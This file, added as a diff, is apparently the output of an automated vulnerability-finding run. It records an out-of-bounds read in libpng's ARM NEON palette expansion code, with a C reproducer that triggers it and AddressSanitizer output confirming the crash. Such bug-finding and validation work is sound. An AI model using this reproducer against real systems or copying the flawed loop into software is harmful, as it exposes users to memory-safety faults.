@@ -1,0 +1,72 @@
+{
+  "baseline": "B3",
+  "vulnerability": {
+    "file": "arm/palette_neon_intrinsics.c",
+    "line": 70,
+    "function": "png_target_do_expand_palette_rgba8_neon",
+    "bug_type": "out-of-bounds-read",
+    "cwe": "CWE-125",
+    "confidence": "high",
+    "explanation": "In the same loop, when row_width is not a multiple of 4 and >=5, sp is moved before the start of the source row (e.g., sp = *ssp - 4 then accesses *(sp - 3)), causing reads from memory preceding the source buffer.",
+    "abs_path": "/tmp/libpng_upstream/arm/palette_neon_intrinsics.c"
+  },
+  "reproducer_code": "#include <stdio.h>\n#include <stdint.h>\n#include <stdlib.h>\n#include <string.h>\n\n/* Minimal typedefs to match the vulnerable function's signature */\ntypedef uint32_t png_uint_32;\ntypedef unsigned char png_byte;\n\n/* No-op debug macro */\n#define png_debug(level, msg) do { (void)(level); } while (0)\n\n/* Stub NEON-like types and intrinsics so this compiles on non-ARM targets */\ntypedef struct { uint32_t v[4]; } uint32x4_t;\n\nstatic inline uint32x4_t vld1q_dup_u32(const uint32_t *p)\n{\n    uint32x4_t r;\n    r.v[0] = *p;\n    r.v[1] = *p;\n    r.v[2] = *p;\n    r.v[3] = *p;\n    return r;\n}\n\nstatic inline uint32x4_t vld1q_lane_u32(const uint32_t *p, uint32x4_t r, int lane)\n{\n    if (lane >= 0 && lane < 4) r.v[lane] = *p;\n    return r;\n}\n\nstatic inline void vst1q_u32(void *dst, uint32x4_t r)\n{\n    memcpy(dst, r.v, sizeof(r.v));\n}\n\n/* Vulnerable function (adapted from the provided source context) */\nstatic png_uint_32\npng_target_do_expand_palette_rgba8_neon(const png_uint_32 *riffled_palette,\n    png_uint_32 row_width, const png_byte **ssp, png_byte **ddp)\n{\n    const png_uint_32 pixels_per_chunk = 4;\n    png_uint_32 i;\n\n    png_debug(1, \"in png_do_expand_palette_rgba8_neon\");\n\n    if (row_width < pixels_per_chunk)\n        return 0;\n\n    /* This function originally gets the last byte of the output row.\n     * The NEON part writes forward from a given position, so we have\n     * to seek this back by 4 pixels x 4 bytes.\n     */\n    *ddp = *ddp - ((pixels_per_chunk * sizeof(png_uint_32)) - 1);\n\n    for (i = 0; i < row_width; i += pixels_per_chunk)\n    {\n        uint32x4_t cur;\n        const png_byte *sp = *ssp - i;\n        png_byte *dp = *ddp - (i << 2);\n        /* BUG: When row_width is not a multiple of 4 and >= 5, on the\n         * second iteration (i == 4), sp points before the start of the\n         * source row, so (sp - 3) underflows and is an OOB read.\n         */\n        cur = vld1q_dup_u32 (riffled_palette + *(sp - 3));\n        cur = vld1q_lane_u32(riffled_palette + *(sp - 2), cur, 1);\n        cur = vld1q_lane_u32(riffled_palette + *(sp - 1), cur, 2);\n        cur = vld1q_lane_u32(riffled_palette + *(sp - 0), cur, 3);\n        vst1q_u32((void *)dp, cur);\n    }\n    if (i != row_width)\n    {\n        /* Remove the amount that wasn't processed. */\n        i -= pixels_per_chunk;\n    }\n\n    /* Decrement output pointers. */\n    *ssp = *ssp - i;\n    *ddp = *ddp - (i << 2);\n    return i;\n}\n\nint main(void)\n{\n    /* row_width chosen to be 5: not a multiple of 4 and >= 5 to hit the bug */\n    const png_uint_32 row_width = 5;\n\n    /* Allocate a small source row of exactly 5 bytes.\n     * ASan will place a left redzone before this allocation so reading\n     * 3 bytes before will trigger a heap-buffer-underflow.\n     */\n    png_byte *src = (png_byte *)malloc(row_width);\n    if (!src) return 1;\n\n    /* Fill with valid palette indices [0..255] */\n    for (png_uint_32 i = 0; i < row_width; ++i)\n        src[i] = (png_byte)(i & 0xFF);\n\n    /* Prepare destination buffer for RGBA8 output: row_width * 4 bytes */\n    png_byte *dst = (png_byte *)malloc(row_width * 4);\n    if (!dst) return 1;\n\n    /* Prepare a simple riffled palette of 256 entries */\n    png_uint_32 *riffled_palette = (png_uint_32 *)malloc(256 * sizeof(png_uint_32));\n    if (!riffled_palette) return 1;\n    for (int i = 0; i < 256; ++i)\n        riffled_palette[i] = (png_uint_32)(0xFF000000u | (i << 16) | (i << 8) | i);\n\n    /* Set ssp to point at the last byte of the source row (as expected by the function) */\n    const png_byte *ssp = src + row_width - 1;  /* src[4] */\n\n    /* Set ddp to point at the last byte of the output row */\n    png_byte *ddp = dst + (row_width * 4) - 1;  /* dst[19] */\n\n    /* Call the vulnerable function: on the second iteration (i == 4), it will read *(sp - 3)\n     * where sp == ssp - 4 == src - 0, so (sp - 3) == src - 3 (OOB read before buffer).\n     */\n    (void)png_target_do_expand_palette_rgba8_neon(riffled_palette, row_width, &ssp, &ddp);\n\n    /* Cleanup (we likely won't reach here if ASan aborts on error) */\n    free(riffled_palette);\n    free(dst);\n    free(src);\n\n    return 0;\n}\n",
+  "validation": {
+    "verdict": "CONCRETE_CONFIRMED",
+    "asan": {
+      "asan_triggered": true,
+      "exit_code": 1,
+      "elapsed": 0.8998792171478271,
+      "output": "=================================================================\n==3707680==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000000d at pc 0x58169a77440a bp 0x7ffdd46aa030 sp 0x7ffdd46aa028\nREAD of size 1 at 0x60200000000d thread T0\n    #0 0x58169a774409 in png_target_do_expand_palette_rgba8_neon /app/se_runs/b3/libpng_747dd02_vul/findings/palette_neon_intrinsics_70_out-of-bounds-read/reproducer.c:65:48\n    #1 0x58169a774012 in main /app/se_runs/b3/libpng_747dd02_vul/findings/palette_neon_intrinsics_70_out-of-bounds-read/reproducer.c:118:11\n    #2 0x7816d622a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #3 0x7816d622a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #4 0x58169a6b4304 in _start (/app/se_runs/b3/libpng_747dd02_vul/findings/palette_neon_intrinsics_70_out-of-bounds-read/reproducer+0x20304) (BuildId: 22f8edc9296c61ac96b83edb9d7cd68be2727d27)\n\n0x60200000000d is located 3 bytes to the left of 5-byte region [0x602000000010,0x602000000015)\nallocated by thread T0 here:\n    #0 0x58169a737d12 in __interceptor_malloc (/app/se_runs/b3/libpng_747dd02_vul/findings/palette_neon_intrinsics_70_out-of-bounds-read/reproducer+0xa3d12) (BuildId: 22f8edc9296c61ac96b83edb9d7cd68be2727d27)\n    #1 0x58169a773d8b in main /app/se_runs/b3/libpng_747dd02_vul/findings/palette_neon_intrinsics_70_out-of-bounds-read/reproducer.c:92:33\n    #2 0x7816d622a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #3 0x7816d622a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #4 0x58169a6b4304 in _start (/app/se_runs/b3/libpng_747dd02_vul/findings/palette_neon_intrinsics_70_out-of-bounds-read/reproducer+0x20304) (BuildId: 22f8edc9296c61ac96b83edb9d7cd68be2727d27)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /app/se_runs/b3/libpng_747dd02_vul/findings/palette_neon_intrinsics_70_out-of-bounds-read/reproducer.c:65:48 in png_target_do_expand_palette_rgba8_neon\nShadow bytes around the buggy address:\n  0x0c047fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c047fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c047fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c047fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0c047fff8000: fa[fa]05 fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c047fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c047fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c047fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c047fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==3707680==ABORTING\n",
+      "error_type": "heap-buffer-overflow",
+      "crash_function": "png_target_do_expand_palette_rgba8_neon",
+      "crash_file": "/app/se_runs/b3/libpng_747dd02_vul/findings/palette_neon_intrinsics_70_out-of-bounds-read/reproducer.c:65",
+      "crash_line": 48,
+      "frames": [
+        [
+          "0",
+          "png_target_do_expand_palette_rgba8_neon",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/palette_neon_intrinsics_70_out-of-bounds-read/reproducer.c:65",
+          "48"
+        ],
+        [
+          "1",
+          "main",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/palette_neon_intrinsics_70_out-of-bounds-read/reproducer.c:118",
+          "11"
+        ],
+        [
+          "2",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "3",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ],
+        [
+          "1",
+          "main",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/palette_neon_intrinsics_70_out-of-bounds-read/reproducer.c:92",
+          "33"
+        ],
+        [
+          "2",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "3",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ]
+      ],
+      "is_harness_artifact": false
+    }
+  }
+}
